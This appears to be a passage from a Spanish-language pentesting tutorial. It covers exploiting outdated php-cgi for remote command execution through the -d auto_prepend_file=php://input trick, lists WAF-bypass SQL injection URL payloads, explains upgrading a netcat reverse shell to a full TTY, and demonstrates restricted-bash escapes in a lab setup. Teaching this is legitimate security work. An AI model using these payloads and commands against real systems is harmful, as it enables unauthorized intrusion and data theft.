<p>A continuación, se detalla una vulnerabilidad presente en algunos <strong>php-cgi</strong> desactualizados, los cuales nos permiten entre otras cosas lograr la ejecución remota de comandos.</p>
<p>La pregunta a hacerse es, ¿cómo comprobamos si en caso de que exista, posee una versión vulnerable?. Dado que uno de los parámetros con los que cuenta el binario es el <strong>-s</strong>, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso <strong>/?-s</strong>.</p>
<p>Si lo que vemos es el código fuente en vez del contenido de la página en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer <strong>RCE</strong> (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a través del parámetro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la máquina que sustenta este servidor web.</p>
<p>Sin embargo, existe otro parámetro interesante del php-cgi del cual nos podemos aprovechar, el parámetro <strong>-d</strong>. Este parámetro nos permite definir las entradas <strong>INI</strong> de la configuración de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecución remota de código, es tratar de enviar código PHP al servidor y que sea capaz de interpretarlo. </p>
<p>Para ello, lo que hacemos es utilizar el <em>wrapper</em> <strong>php://input</strong>, con el fin de incrustar el código definido en el cuerpo de la solicitud.</p>
<p>Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el código php de nuestra solicitud. Lo que buscamos es una opción PHP que diga al propio PHP que lea de un archivo y lo apunte a <strong>php://input</strong>. Afortunadamente, PHP cuenta con la opción <strong>auto_prepend_file</strong> desde la versión 4.2.3. Lo bueno de esta opción, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro código, por lo que garantizamos que ningún otro código afecte a nuestra explotación.</p>
<p>Por otro lado, si queremos usar <strong>php://input</strong>, debemos permitir que la url lo incluya, pero esto no supone ningún problema, dado que podemos redefinir las entradas INI. Esto puede activarse fácilmente usando <strong>-d allow_url_include=1</strong>.</p>
<p>Suponiendo que quisiéramos ejecutar en remoto el comando <em>whoami</em>, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente vía POST a la web con todo lo que hemos comentado. De la siguiente forma:</p>
<div class="codehilite"><pre><span></span><code>$~<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;?php system(&#39;whoami&#39;);die(); ?&gt;&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>POST<span class="w"> </span><span class="s2">&quot;http://192.168.1.X/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input&quot;</span>

www-data
</code></pre></div>

<p>Para entablar una reverse shell, ya simplemente dependerá de la metodología que una quiera emplear.</p>
<h4 id="waf-bypassing">Waf Bypassing<a class="headerlink" href="#waf-bypassing" title="Permanent link">&para;</a></h4>
<h5 id="waf-sql-injection-bypass-waf-techniques">WAF SQL Injection Bypass WAF Techniques<a class="headerlink" href="#waf-sql-injection-bypass-waf-techniques" title="Permanent link">&para;</a></h5>
<p><strong>1. Null Bytes</strong></p>
<p>Para elaborar una inyección <strong>Null Byte</strong>:</p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span><span class="m">1</span>+%00’union+select+1,2,3′–
</code></pre></div>

<p><strong>2. Consultas a través de SQL Comments</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span><span class="m">1</span>+un/**/ion+se/**/lect+1,2,3–
</code></pre></div>

<p><strong>3. URL Encoding</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1<span class="w"> </span>/*!u%6eion*/<span class="w"> </span>/*!se%6cect*/<span class="w"> </span><span class="m">1</span>,2,3,4—
</code></pre></div>

<p><strong>4. Encode to Hex Forbidden</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5<span class="w"> </span>–+-

http://example.com/news.php?id<span class="o">=</span>-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5<span class="w"> </span>–+-
</code></pre></div>

<p><strong>5. Case Changing</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1+UnIoN//SeLecT//1,2,3–+-
</code></pre></div>

<p><strong>6. Replaced Keywords</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1+UNunionION+SEselectLECT+1,2,3–+
</code></pre></div>

<p><strong>7. WAF Bypassing - using characters</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1+uni*on+sel*ect+1,2,3,4–+-
</code></pre></div>

<p><strong>8. CRLF WAF Bypass Technique</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span>-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5<span class="w"> </span>—
</code></pre></div>

<p><strong>9. HTTP Parameter Pollution (PHP)</strong></p>
<div class="codehilite"><pre><span></span><code>http://example.com/news.php?id<span class="o">=</span><span class="m">1</span><span class="p">;</span><span class="k">select</span>+1<span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="m">2</span>,3+from+users+where+id<span class="o">=</span><span class="m">1</span>–


http://example.com/news.php?id<span class="o">=</span>-1/*<span class="w"> </span><span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="w"> </span>*/union/*<span class="w"> </span><span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="w"> </span>*/select/*<span class="w"> </span><span class="p">&amp;</span><span class="nv">id</span><span class="o">=</span><span class="w"> </span>*/1,2<span class="w"> </span>—
</code></pre></div>

<h3 id="pentesting-linux">Pentesting Linux<a class="headerlink" href="#pentesting-linux" title="Permanent link">&para;</a></h3>
<h4 id="tratamiento-de-la-tty">Tratamiento de la TTY<a class="headerlink" href="#tratamiento-de-la-tty" title="Permanent link">&para;</a></h4>
<p>Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuación.</p>
<ul>
<li>Cargamos una pseudoconsola sobre el sistema</li>
</ul>
<p>Tenemos 2 formas de hacer esto, la primera es la siguiente:</p>
<div class="codehilite"><pre><span></span><code>script<span class="w"> </span>/dev/null<span class="w"> </span>-c<span class="w"> </span>bash
</code></pre></div>

<p>Otra de ellas es a través de python, para ello se recomienda aplicar un <code>whereis python</code> a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, así tendremos que aplicar el siguiente comando seguido de su versión:</p>
<div class="codehilite"><pre><span></span><code>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
</code></pre></div>

<ul>
<li>Configuramos las variables de entorno correctamente</li>
</ul>
<p>A continuación presionamos la tecla <strong>Ctrl+Z</strong>, esto lo que hará será dejar en segundo plano nuestra sesión (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:</p>
<div class="codehilite"><pre><span></span><code>stty<span class="w"> </span>raw<span class="w"> </span>-echo
<span class="nb">fg</span>
reset
xterm
</code></pre></div>

<p>Tras introducir el primero, es normal que al escribir <strong>fg</strong> no veamos lo que se está escribiendo, sin embargo se están introduciendo los caracteres. Este comando lo que hará será retornanos a la sesión que teníamos vía <strong>Netcat</strong>. Con el comando <strong>reset</strong> reconfiguraremos nuestra sesión, preguntándonos en la mayoría de los casos a continuación con qué tipo de terminal queremos tratar.</p>
<p>Puede ser que no nos pregunte por el tipo de terminal, en caso de que sí lo haga, introducimos <code>xterm</code>, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:</p>
<div class="codehilite"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
<span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
</code></pre></div>

<p>Una vez hecho, lo único que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algún editor como nano, veremos que las proporciones no cuadran. Para ello, lo más recomendable es poner a tamaño completo la terminal.</p>
<p>Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/s4vitar/Desktop<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#stty -a</span>
speed<span class="w"> </span><span class="m">38400</span><span class="w"> </span>baud<span class="p">;</span><span class="w"> </span>rows<span class="w"> </span><span class="m">44</span><span class="p">;</span><span class="w"> </span>columns<span class="w"> </span><span class="m">190</span><span class="p">;</span><span class="w"> </span><span class="nv">line</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
<span class="nv">intr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^C<span class="p">;</span><span class="w"> </span><span class="nv">quit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^<span class="se">\;</span><span class="w"> </span><span class="nv">erase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^?<span class="p">;</span><span class="w"> </span><span class="nb">kill</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^U<span class="p">;</span><span class="w"> </span><span class="nv">eof</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^D<span class="p">;</span><span class="w"> </span><span class="nv">eol</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>&lt;undef&gt;<span class="p">;</span><span class="w"> </span><span class="nv">eol2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>&lt;undef&gt;<span class="p">;</span><span class="w"> </span><span class="nv">swtch</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>&lt;undef&gt;<span class="p">;</span><span class="w"> </span><span class="nv">start</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^Q<span class="p">;</span><span class="w"> </span><span class="nv">stop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^S<span class="p">;</span><span class="w"> </span><span class="nv">susp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^Z<span class="p">;</span><span class="w"> </span><span class="nv">rprnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^R<span class="p">;</span><span class="w"> </span><span class="nv">werase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^W<span class="p">;</span><span class="w"> </span><span class="nv">lnext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^V<span class="p">;</span><span class="w"> </span><span class="nv">discard</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>^O<span class="p">;</span>
<span class="nv">min</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="nb">time</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span>
-parenb<span class="w"> </span>-parodd<span class="w"> </span>-cmspar<span class="w"> </span>cs8<span class="w"> </span>-hupcl<span class="w"> </span>-cstopb<span class="w"> </span>cread<span class="w"> </span>-clocal<span class="w"> </span>-crtscts
-ignbrk<span class="w"> </span>-brkint<span class="w"> </span>-ignpar<span class="w"> </span>-parmrk<span class="w"> </span>-inpck<span class="w"> </span>-istrip<span class="w"> </span>-inlcr<span class="w"> </span>-igncr<span class="w"> </span>icrnl<span class="w"> </span>ixon<span class="w"> </span>-ixoff<span class="w"> </span>-iuclc<span class="w"> </span>-ixany<span class="w"> </span>-imaxbel<span class="w"> </span>iutf8
opost<span class="w"> </span>-olcuc<span class="w"> </span>-ocrnl<span class="w"> </span>onlcr<span class="w"> </span>-onocr<span class="w"> </span>-onlret<span class="w"> </span>-ofill<span class="w"> </span>-ofdel<span class="w"> </span>nl0<span class="w"> </span>cr0<span class="w"> </span>tab0<span class="w"> </span>bs0<span class="w"> </span>vt0<span class="w"> </span>ff0
isig<span class="w"> </span>icanon<span class="w"> </span>iexten<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>echoe<span class="w"> </span>echok<span class="w"> </span>-echonl<span class="w"> </span>-noflsh<span class="w"> </span>-xcase<span class="w"> </span>-tostop<span class="w"> </span>-echoprt<span class="w"> </span>echoctl<span class="w"> </span>echoke<span class="w"> </span>-flusho<span class="w"> </span>-extproc
</code></pre></div>

<p>Tal y como podemos ver, figuran los números de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuración en la máquina que hemos comprometido donde se ha llevado a cabo toda la previa configuración, aplicando para ello el siguiente comandos:</p>
<div class="codehilite"><pre><span></span><code>stty<span class="w"> </span>rows<span class="w"> </span><span class="m">44</span><span class="w"> </span>columns<span class="w"> </span><span class="m">190</span>
</code></pre></div>

<p>El resultado final será una Shell completamente interactiva, donde nos sentiremos como si hubiéramos ganado acceso por SSH, con capacidad de tabulación, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.</p>
<h4 id="process-monitoring">Process Monitoring<a class="headerlink" href="#process-monitoring" title="Permanent link">&para;</a></h4>
<p>A la hora de escalar privilegios, es una buena idea montarse un script <strong>procmon.sh</strong> para la monitorización de procesos y comandos aplicados a nivel de sistema en tiempo real.</p>
<p>Para ello, tan sólo tendremos que crear un script sobre el sistema como el siguiente:</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="nv">old_process</span><span class="o">=</span><span class="k">$(</span>ps<span class="w"> </span>-eo<span class="w"> </span><span class="nb">command</span><span class="k">)</span>

<span class="k">while</span><span class="w"> </span>true<span class="p">;</span><span class="w"> </span><span class="k">do</span>
<span class="w">    </span><span class="nv">new_process</span><span class="o">=</span><span class="k">$(</span>ps<span class="w"> </span>-eo<span class="w"> </span><span class="nb">command</span><span class="k">)</span>
<span class="w">    </span>diff<span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$old_process</span><span class="s2">&quot;</span><span class="o">)</span><span class="w"> </span>&lt;<span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$new_process</span><span class="s2">&quot;</span><span class="o">)</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;[\&gt;\&lt;]&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;procmon.sh&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;command&quot;</span>
<span class="w">    </span><span class="nv">old_process</span><span class="o">=</span><span class="nv">$new_process</span>
<span class="k">done</span>
</code></pre></div>

<p>Tras su ejecución, tendremos una visual de toods los comandos que se están aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.</p>
<h4 id="escaping-restricted-shell">Escaping Restricted Shell<a class="headerlink" href="#escaping-restricted-shell" title="Permanent link">&para;</a></h4>
<p>Con el objetivo de preparar un escenario realista, presentaré 2 casos, partiendo de una escapada convencional a otra un poco más rebuscada. También hay que decir que todo dependerá del nivel de restricción que el administrador haya implementado sobre el usuario.</p>
<p>Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#mkdir testuser</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#useradd testuser -d /home/testuser -s /bin/rbash</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#passwd testuser</span>
Introduzca<span class="w"> </span>la<span class="w"> </span>nueva<span class="w"> </span>contraseña<span class="w"> </span>de<span class="w"> </span>UNIX:<span class="w"> </span>
Vuelva<span class="w"> </span>a<span class="w"> </span>escribir<span class="w"> </span>la<span class="w"> </span>nueva<span class="w"> </span>contraseña<span class="w"> </span>de<span class="w"> </span>UNIX:<span class="w"> </span>
passwd:<span class="w"> </span>contraseña<span class="w"> </span>actualizada<span class="w"> </span>correctamente
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#chown testuser:testuser /home/testuser</span>
</code></pre></div>

<p>En este caso, la contraseña asignada ha sido <strong>test123</strong>. Como vemos, se ha asignado una shell restrictiva al usuario <strong>testuser</strong>, esto lo podemos comprobar a través de la variable <strong>export</strong>:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">export</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">DBUS_SESSION_BUS_ADDRESS</span><span class="o">=</span><span class="s2">&quot;unix:path=/run/user/1002/bus&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">HOME</span><span class="o">=</span><span class="s2">&quot;/home/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">LANG</span><span class="o">=</span><span class="s2">&quot;es_ES.UTF-8&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">LOGNAME</span><span class="o">=</span><span class="s2">&quot;testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">MAIL</span><span class="o">=</span><span class="s2">&quot;/var/mail/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span>OLDPWD
<span class="nb">declare</span><span class="w"> </span>-rx<span class="w"> </span><span class="nv">PATH</span><span class="o">=</span><span class="s2">&quot;/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">PWD</span><span class="o">=</span><span class="s2">&quot;/home/testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-rx<span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span><span class="s2">&quot;/bin/rbash&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SHLVL</span><span class="o">=</span><span class="s2">&quot;1&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SSH_CLIENT</span><span class="o">=</span><span class="s2">&quot;::1 48084 22&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SSH_CONNECTION</span><span class="o">=</span><span class="s2">&quot;::1 48084 ::1 22&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">SSH_TTY</span><span class="o">=</span><span class="s2">&quot;/dev/pts/1&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">TERM</span><span class="o">=</span><span class="s2">&quot;xterm&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">USER</span><span class="o">=</span><span class="s2">&quot;testuser&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">XDG_DATA_DIRS</span><span class="o">=</span><span class="s2">&quot;/usr/local/share:/usr/share:/var/lib/snapd/desktop&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">XDG_RUNTIME_DIR</span><span class="o">=</span><span class="s2">&quot;/run/user/1002&quot;</span>
<span class="nb">declare</span><span class="w"> </span>-x<span class="w"> </span><span class="nv">XDG_SESSION_ID</span><span class="o">=</span><span class="s2">&quot;80&quot;</span>
testuser@parrot:~$<span class="w"> </span>
</code></pre></div>

<p>Tal y como vemos en la variable <strong>SHELL</strong>, tenemos la <em>restricted bash</em>. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparía con estos inconvenientes:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">pwd</span>
/home/testuser
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span>
-rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
-rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/
-rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span>prueba<span class="w"> </span>&gt;<span class="w"> </span>fichero.txt
-rbash:<span class="w"> </span>fichero.txt:<span class="w"> </span>restringido:<span class="w"> </span>no<span class="w"> </span>se<span class="w"> </span>puede<span class="w"> </span>redirigir<span class="w"> </span>la<span class="w"> </span>salida
testuser@parrot:~$<span class="w"> </span>touch<span class="w"> </span>fichero
testuser@parrot:~$<span class="w"> </span>mkdir<span class="w"> </span>directorio
testuser@parrot:~$<span class="w"> </span>ls<span class="w"> </span>-l
total<span class="w"> </span><span class="m">4</span>
drwxr-xr-x<span class="w"> </span><span class="m">2</span><span class="w"> </span>testuser<span class="w"> </span>testuser<span class="w"> </span><span class="m">4096</span><span class="w"> </span>nov<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>directorio
-rw-r--r--<span class="w"> </span><span class="m">1</span><span class="w"> </span>testuser<span class="w"> </span>testuser<span class="w">    </span><span class="m">0</span><span class="w"> </span>nov<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">23</span>:52<span class="w"> </span>fichero
</code></pre></div>

<p>Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sí que es cierto que en cuanto a visualización, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podría no tener en cuenta lo siguiente:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$SHELL</span>
/bin/rbash
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
-rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span>bash
testuser@parrot:~$<span class="w"> </span><span class="nb">pwd</span>
/home/testuser
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
testuser@parrot:/home$<span class="w"> </span>ls
s4vitar<span class="w">  </span>testuser
testuser@parrot:/home$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/
testuser@parrot:/$<span class="w"> </span><span class="nb">pwd</span>
/
testuser@parrot:/$<span class="w"> </span>
</code></pre></div>

<p>Con la misma, el usuario se ha escapado a una <strong>bash</strong>, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, además de asignar dicha Shell se haga algo como esto:</p>
<div class="codehilite"><pre><span></span><code>┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#pwd</span>
/home/testuser
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#mkdir bin</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cd !$</span>
<span class="nb">cd</span><span class="w"> </span>bin
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cp /bin/ping .</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cp /usr/bin/tee .</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cp /bin/ls .</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#ls</span>
ls<span class="w">  </span>ping<span class="w">  </span>tee
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#chmod o+w ping</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser/bin<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cd ..</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#echo -e &quot;PATH=/home/testuser/bin\nexport PATH&quot; &gt; .bashrc</span>
┌─<span class="o">[</span>root@parrot<span class="o">]</span>─<span class="o">[</span>/home/testuser<span class="o">]</span>
└──╼<span class="w"> </span><span class="c1">#cat .bashrc</span>
<span class="nv">PATH</span><span class="o">=</span>/home/testuser/bin
<span class="nb">export</span><span class="w"> </span>PATH
</code></pre></div>

<p>Como vemos en este caso el administrador de sistemas ha decidido que sólo pueda ejecutar esos 3 comandos (<strong>ls ping tee</strong>). </p>
<p>Este caso es a modo de ejemplo, y la asignación de permisos de escritura por parte de otros al binario <strong>ping</strong> se ha hecho a posta para que se vea cómo por esta simple tontería un usuario podría escapar de la restricted bash.</p>
<p>Veamos cómo sería la movilidad a nivel de usuario:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
/home/testuser/bin
testuser@parrot:~$<span class="w"> </span>ls
bin
testuser@parrot:~$<span class="w"> </span>cat<span class="w"> </span>.bashrc
rbash:<span class="w"> </span>cat:<span class="w"> </span>no<span class="w"> </span>se<span class="w"> </span>encontró<span class="w"> </span>la<span class="w"> </span>orden
testuser@parrot:~$<span class="w"> </span>cat<span class="w"> </span>/etc/passwd
rbash:<span class="w"> </span>cat:<span class="w"> </span>no<span class="w"> </span>se<span class="w"> </span>encontró<span class="w"> </span>la<span class="w"> </span>orden
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>..
rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/
rbash:<span class="w"> </span>cd:<span class="w"> </span>restringido
testuser@parrot:~$<span class="w"> </span>touch<span class="w"> </span>archivo
rbash:<span class="w"> </span>touch:<span class="w"> </span>no<span class="w"> </span>se<span class="w"> </span>encontró<span class="w"> </span>la<span class="w"> </span>orden
testuser@parrot:~$<span class="w"> </span>mkdir<span class="w"> </span>directorio
rbash:<span class="w"> </span>mkdir:<span class="w"> </span>no<span class="w"> </span>se<span class="w"> </span>encontró<span class="w"> </span>la<span class="w"> </span>orden
testuser@parrot:~$<span class="w"> </span>ls<span class="w"> </span>bin
ls<span class="w">  </span>ping<span class="w">  </span>tee
testuser@parrot:~$<span class="w"> </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>localhost
ping:<span class="w"> </span>socket:<span class="w"> </span>Operación<span class="w"> </span>no<span class="w"> </span>permitida
testuser@parrot:~$<span class="w"> </span>ping<span class="w"> </span>localhost
ping:<span class="w"> </span>socket:<span class="w"> </span>Operación<span class="w"> </span>no<span class="w"> </span>permitida
testuser@parrot:~$<span class="w"> </span>
</code></pre></div>

<p>El usuario está mucho más limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sólo puede ejecutar 3 comandos muy básicos. Como vemos, el usuario <strong>testuser</strong> no puede visualizar el recurso <strong>.bashrc</strong>, donde está definido su PATH. Esto es así debido a que no puede ejecutar el comando <strong>cat</strong>.</p>
<p>Sin embargo, aprovechando el permiso que el administrador del sistema asignó al binario <strong>ping</strong>, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:</p>
<div class="codehilite"><pre><span></span><code>testuser@parrot:~$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>bin
total<span class="w"> </span><span class="m">240</span>
-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">138856</span><span class="w"> </span>nov<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">23</span>:59<span class="w"> </span>ls
-rwxr-xrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">65272</span><span class="w"> </span>nov<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">23</span>:56<span class="w"> </span>ping
-rwxr-xr-x<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w">  </span><span class="m">39648</span><span class="w"> </span>nov<span class="w"> </span><span class="m">11</span><span class="w"> </span><span class="m">23</span>:57<span class="w"> </span>tee
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;#!/bin/bash&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>bin/ping
<span class="c1">#!/bin/bash</span>
testuser@parrot:~$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;/bin/cat /home/testuser/.bashrc&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>bin/ping
